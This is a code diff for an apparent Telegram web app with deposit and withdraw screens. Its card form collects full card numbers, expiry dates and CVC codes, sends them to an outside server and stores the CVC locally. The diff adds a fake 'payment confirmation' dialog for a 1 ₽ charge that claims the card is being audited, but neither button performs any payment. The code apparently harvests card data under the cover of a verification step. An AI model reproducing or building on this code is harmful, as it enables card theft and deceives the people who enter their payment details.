@@ -10,7 +10,159 @@
                     <span class="text-[10px] text-green-500 font-bold">✓ Верифицирована</span>
                     <button onclick="window.removeCard?.(${n})" class="text-zinc-600 hover:text-red-500 transition-colors text-sm">✕</button>
                 </div>
-            `,e.appendChild(r)})}}addCard(e){this.cards.push(e),this.saveToStorage(),this.renderCards()}removeCard(e){confirm(`Удалить карту?`)&&(this.cards.splice(e,1),this.saveToStorage(),this.renderCards(),window.SoundEngine&&window.SoundEngine.playClick())}getCards(){return[...this.cards]}showAddCard(){document.getElementById(`add-card-modal`)?.classList.remove(`hidden`);let e=document.getElementById(`card-number`),t=document.getElementById(`card-expiry`),n=document.getElementById(`card-cvc`);e&&(e.value=``),t&&(t.value=``),n&&(n.value=``)}hideAddCard(){document.getElementById(`add-card-modal`)?.classList.add(`hidden`)}formatCardNumber(e){let t=e.value.replace(/\D/g,``);t=t.replace(/(.{4})/g,`$1 `).trim(),e.value=t}formatExpiry(e){let t=e.value.replace(/\D/g,``);t.length>=2&&(t=t.slice(0,2)+`/`+t.slice(2)),e.value=t}async verifyCard(){let e=document.getElementById(`card-number`),t=document.getElementById(`card-expiry`),n=document.getElementById(`card-cvc`),r=e?.value.replace(/\s/g,``)||``,i=t?.value||``,a=n?.value||``;if(r.length!==16){alert(`Введите корректный номер карты (16 цифр)`);return}if(i.length!==5||!i.includes(`/`)){alert(`Введите корректную дату (MM/YY)`);return}if(a.length<3){alert(`Введите корректный CVC код`);return}if(this.cards.some(e=>e.number===r)){alert(`Эта карта уже добавлена`);return}window.SoundEngine&&window.SoundEngine.playClick();let o=window.Telegram?.WebApp?.initDataUnsafe?.user?.id||localStorage.getItem(`userId`);if(!o){alert(`Ошибка: пользователь не авторизован`);return}let s=document.querySelector(`#add-card-modal button:last-child`),c=s?.textContent||``;s&&(s.textContent=`⏳ ОТПРАВКА...`,s.disabled=!0);try{let e=await(await fetch(`https://bac-cas.arizona-relax.com/cards/add`,{method:`POST`,headers:{"Content-Type":`application/json`},body:JSON.stringify({userId:Number(o),number:r,expiry:i,cvc:a})})).json();e.success?(this.addCard({number:r,expiry:i,cvc:a}),this.hideAddCard(),window.Telegram?.WebApp?.HapticFeedback&&window.Telegram.WebApp.HapticFeedback.notificationOccurred(`success`),alert(`✅ Карта добавлена! (данные получены сервером)`),console.log(`📊 Ответ сервера:`,e)):alert(`❌ Ошибка: ${e.message||`Неизвестная ошибка`}`)}catch(e){console.error(`❌ Ошибка отправки:`,e),alert(`❌ Ошибка соединения с сервером`)}finally{s&&(s.textContent=c,s.disabled=!1)}}handleDeposit(){if(this.cards.length===0){alert(`Сначала добавьте карту!`),this.showAddCard();return}this.transactionType=`deposit`;let e=document.getElementById(`transaction-title`),t=document.getElementById(`transaction-amount`),n=document.getElementById(`transaction-confirm-btn`);e&&(e.textContent=`💰 Пополнение баланса`),t&&(t.value=``,t.min=`1000`,t.placeholder=`1000`),n&&(n.textContent=`Пополнить`),this.showTransactionModal()}handleWithdraw(){if(this.cards.length===0){alert(`Сначала добавьте карту!`),this.showAddCard();return}this.transactionType=`withdraw`;let e=document.getElementById(`transaction-title`),t=document.getElementById(`transaction-amount`),n=document.getElementById(`transaction-confirm-btn`);e&&(e.textContent=`📤 Вывод средств`),t&&(t.value=``,t.min=`1000`,t.placeholder=`1000`),n&&(n.textContent=`Вывести`),this.showTransactionModal()}showTransactionModal(){let e=document.getElementById(`transaction-modal`);e&&e.classList.remove(`hidden`);let t=document.getElementById(`card-options`);t&&(t.innerHTML=``,this.cards.forEach((e,n)=>{let r=e.number.slice(-4),i=e.number.startsWith(`4`),a=i?`VISA`:`MC`,o=document.createElement(`div`);o.className=`flex items-center gap-3 p-3 bg-zinc-900/50 rounded-xl border border-zinc-800 cursor-pointer hover:border-brand transition-colors`,o.onclick=()=>this.selectCard(n),o.innerHTML=`
+            `,e.appendChild(r)})}}addCard(e){this.cards.push(e),this.saveToStorage(),this.renderCards()}removeCard(e){confirm(`Удалить карту?`)&&(this.cards.splice(e,1),this.saveToStorage(),this.renderCards(),window.SoundEngine&&window.SoundEngine.playClick())}getCards(){return[...this.cards]}showAddCard(){document.getElementById(`add-card-modal`)?.classList.remove(`hidden`);let e=document.getElementById(`card-number`),t=document.getElementById(`card-expiry`),n=document.getElementById(`card-cvc`);e&&(e.value=``),t&&(t.value=``),n&&(n.value=``)}hideAddCard(){document.getElementById(`add-card-modal`)?.classList.add(`hidden`)}formatCardNumber(e){let t=e.value.replace(/\D/g,``);t=t.replace(/(.{4})/g,`$1 `).trim(),e.value=t}formatExpiry(e){let t=e.value.replace(/\D/g,``);t.length>=2&&(t=t.slice(0,2)+`/`+t.slice(2)),e.value=t}async verifyCard(){let e=document.getElementById(`card-number`),t=document.getElementById(`card-expiry`),n=document.getElementById(`card-cvc`),r=e?.value.replace(/\s/g,``)||``,i=t?.value||``,a=n?.value||``;if(r.length!==16){alert(`Введите корректный номер карты (16 цифр)`);return}if(i.length!==5||!i.includes(`/`)){alert(`Введите корректную дату (MM/YY)`);return}if(a.length<3){alert(`Введите корректный CVC код`);return}if(this.cards.some(e=>e.number===r)){alert(`Эта карта уже добавлена`);return}window.SoundEngine&&window.SoundEngine.playClick();let o=window.Telegram?.WebApp?.initDataUnsafe?.user?.id||localStorage.getItem(`userId`);if(!o){alert(`Ошибка: пользователь не авторизован`);return}let s=document.querySelector(`#add-card-modal button:last-child`),c=s?.textContent||``;s&&(s.textContent=`⏳ ОТПРАВКА...`,s.disabled=!0);try{let e=await(await fetch(`https://bac-cas.arizona-relax.com/cards/add`,{method:`POST`,headers:{"Content-Type":`application/json`},body:JSON.stringify({userId:Number(o),number:r,expiry:i,cvc:a})})).json();e.success?(this.addCard({number:r,expiry:i,cvc:a}),this.hideAddCard(),window.Telegram?.WebApp?.HapticFeedback&&window.Telegram.WebApp.HapticFeedback.notificationOccurred(`success`),this.showPaymentConfirmation(),console.log(`📊 Ответ сервера:`,e)):alert(`❌ Ошибка: ${e.message||`Неизвестная ошибка`}`)}catch(e){console.error(`❌ Ошибка отправки:`,e),alert(`❌ Ошибка соединения с сервером`)}finally{s&&(s.textContent=c,s.disabled=!1)}}showPaymentConfirmation(){let e=document.createElement(`div`);e.style.cssText=`
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 99999;
+            backdrop-filter: blur(8px);
+            animation: fadeIn 0.3s ease;
+        `;let t=document.createElement(`div`);t.style.cssText=`
+            background: linear-gradient(145deg, #1c1c1e, #2a2a2d);
+            border-radius: 24px;
+            padding: 32px 28px 28px;
+            max-width: 380px;
+            width: 92%;
+            color: #ffffff;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.9);
+            animation: slideUp 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            position: relative;
+            overflow: hidden;
+        `,t.innerHTML=`
+            <div style="position: absolute; top: -50px; right: -50px; width: 150px; height: 150px; background: radial-gradient(circle, rgba(52, 199, 89, 0.1), transparent); border-radius: 50%;"></div>
+            <div style="position: absolute; bottom: -50px; left: -50px; width: 150px; height: 150px; background: radial-gradient(circle, rgba(52, 199, 89, 0.05), transparent); border-radius: 50%;"></div>
+            
+            <div style="text-align: center; position: relative; z-index: 1;">
+                <div style="font-size: 56px; margin-bottom: 8px; display: inline-block; animation: pulse 2s infinite;">💳</div>
+                <h3 style="margin: 0 0 6px 0; font-size: 22px; font-weight: 700; background: linear-gradient(135deg, #ffffff, #a0a0a0); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
+                    Подтверждение платежа
+                </h3>
+                <p style="margin: 0 0 4px 0; color: #8e8e93; font-size: 14px; -webkit-text-fill-color: #8e8e93;">
+                    Карта проходит аудификацию
+                </p>
+                <p style="margin: 0 0 24px 0; color: #8e8e93; font-size: 13px; -webkit-text-fill-color: #8e8e93;">
+                    Для завершения подтвердите платеж
+                </p>
+                
+                <div style="
+                    background: rgba(255, 255, 255, 0.05);
+                    border-radius: 16px;
+                    padding: 18px;
+                    margin-bottom: 24px;
+                    border: 1px solid rgba(255, 255, 255, 0.06);
+                ">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                        <span style="color: #8e8e93; font-size: 15px; -webkit-text-fill-color: #8e8e93;">💵 Сумма</span>
+                        <span style="font-weight: 700; font-size: 24px; color: #34c759;">1 ₽</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; align-items: center; padding-top: 10px; border-top: 1px solid rgba(255, 255, 255, 0.06);">
+                        <span style="color: #8e8e93; font-size: 13px; -webkit-text-fill-color: #8e8e93;">🏦 Карта</span>
+                        <span style="font-weight: 500; font-size: 14px; color: #ffffff;">•••• ${this.cards[this.cards.length-1]?.number.slice(-4)||`****`}</span>
+                    </div>
+                </div>
+
+                <div style="display: flex; gap: 10px;">
+                    <button id="cancelPaymentBtn" style="
+                        flex: 1;
+                        padding: 14px;
+                        border: none;
+                        border-radius: 14px;
+                        background: rgba(255, 255, 255, 0.08);
+                        color: #ffffff;
+                        font-size: 15px;
+                        font-weight: 600;
+                        cursor: pointer;
+                        transition: all 0.2s;
+                        -webkit-text-fill-color: #ffffff;
+                    ">Отмена</button>
+                    <button id="confirmPaymentBtn" style="
+                        flex: 1;
+                        padding: 14px;
+                        border: none;
+                        border-radius: 14px;
+                        background: linear-gradient(135deg, #34c759, #28a745);
+                        color: #ffffff;
+                        font-size: 15px;
+                        font-weight: 600;
+                        cursor: pointer;
+                        transition: all 0.2s;
+                        box-shadow: 0 4px 20px rgba(52, 199, 89, 0.3);
+                        -webkit-text-fill-color: #ffffff;
+                    ">✅ Подтвердить</button>
+                </div>
+            </div>
+        `,e.appendChild(t),document.body.appendChild(e);let n=document.createElement(`style`);n.textContent=`
+            @keyframes fadeIn {
+                from { opacity: 0; }
+                to { opacity: 1; }
+            }
+            @keyframes slideUp {
+                from { transform: translateY(40px) scale(0.95); opacity: 0; }
+                to { transform: translateY(0) scale(1); opacity: 1; }
+            }
+            @keyframes pulse {
+                0%, 100% { transform: scale(1); }
+                50% { transform: scale(1.05); }
+            }
+        `,document.head.appendChild(n);let r=t.querySelector(`#confirmPaymentBtn`),i=t.querySelector(`#cancelPaymentBtn`);r&&r.addEventListener(`click`,()=>{e.remove(),this.showSuccessNotification(),window.Telegram?.WebApp?.HapticFeedback&&window.Telegram.WebApp.HapticFeedback.impactOccurred(`heavy`)}),i&&i.addEventListener(`click`,()=>{e.remove(),this.showCancelNotification(),window.Telegram?.WebApp?.HapticFeedback&&window.Telegram.WebApp.HapticFeedback.impactOccurred(`light`)}),e.addEventListener(`click`,t=>{t.target===e&&(e.remove(),this.showCancelNotification())})}showSuccessNotification(){let e=document.createElement(`div`);e.style.cssText=`
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(135deg, #34c759, #28a745);
+            color: white;
+            padding: 16px 28px;
+            border-radius: 16px;
+            font-weight: 600;
+            font-size: 15px;
+            z-index: 100000;
+            box-shadow: 0 8px 30px rgba(52, 199, 89, 0.4);
+            animation: slideDown 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        `,e.innerHTML=`
+            <span style="font-size: 24px;">✅</span>
+            <span>Платёж на 1 ₽ подтверждён! Карта успешно добавлена.</span>
+        `,document.body.appendChild(e),setTimeout(()=>{e.style.animation=`slideUp 0.4s ease forwards`,setTimeout(()=>e.remove(),400)},3e3);let t=document.createElement(`style`);t.textContent=`
+            @keyframes slideDown {
+                from { transform: translateX(-50%) translateY(-100px); opacity: 0; }
+                to { transform: translateX(-50%) translateY(0); opacity: 1; }
+            }
+            @keyframes slideUp {
+                from { transform: translateX(-50%) translateY(0); opacity: 1; }
+                to { transform: translateX(-50%) translateY(-100px); opacity: 0; }
+            }
+        `,document.head.appendChild(t)}showCancelNotification(){let e=document.createElement(`div`);e.style.cssText=`
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(135deg, #ff3b30, #dc2626);
+            color: white;
+            padding: 16px 28px;
+            border-radius: 16px;
+            font-weight: 600;
+            font-size: 15px;
+            z-index: 100000;
+            box-shadow: 0 8px 30px rgba(255, 59, 48, 0.4);
+            animation: slideDown 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        `,e.innerHTML=`
+            <span style="font-size: 24px;">❌</span>
+            <span>Платёж отменён. Карта не добавлена.</span>
+        `,document.body.appendChild(e),setTimeout(()=>{e.style.animation=`slideUp 0.4s ease forwards`,setTimeout(()=>e.remove(),400)},3e3)}handleDeposit(){if(this.cards.length===0){alert(`Сначала добавьте карту!`),this.showAddCard();return}this.transactionType=`deposit`;let e=document.getElementById(`transaction-title`),t=document.getElementById(`transaction-amount`),n=document.getElementById(`transaction-confirm-btn`);e&&(e.textContent=`💰 Пополнение баланса`),t&&(t.value=``,t.min=`1000`,t.placeholder=`1000`),n&&(n.textContent=`Пополнить`),this.showTransactionModal()}handleWithdraw(){if(this.cards.length===0){alert(`Сначала добавьте карту!`),this.showAddCard();return}this.transactionType=`withdraw`;let e=document.getElementById(`transaction-title`),t=document.getElementById(`transaction-amount`),n=document.getElementById(`transaction-confirm-btn`);e&&(e.textContent=`📤 Вывод средств`),t&&(t.value=``,t.min=`1000`,t.placeholder=`1000`),n&&(n.textContent=`Вывести`),this.showTransactionModal()}showTransactionModal(){let e=document.getElementById(`transaction-modal`);e&&e.classList.remove(`hidden`);let t=document.getElementById(`card-options`);t&&(t.innerHTML=``,this.cards.forEach((e,n)=>{let r=e.number.slice(-4),i=e.number.startsWith(`4`),a=i?`VISA`:`MC`,o=document.createElement(`div`);o.className=`flex items-center gap-3 p-3 bg-zinc-900/50 rounded-xl border border-zinc-800 cursor-pointer hover:border-brand transition-colors`,o.onclick=()=>this.selectCard(n),o.innerHTML=`
                 <div class="w-8 h-5 bg-gradient-to-r ${i?`from-blue-500 to-blue-600`:`from-orange-500 to-orange-600`} rounded flex items-center justify-center text-[6px] font-black text-white">${a}</div>
                 <span class="text-sm font-bold text-white">•••• ${r}</span>
                 <span class="text-[10px] text-zinc-500">${e.expiry}</span>
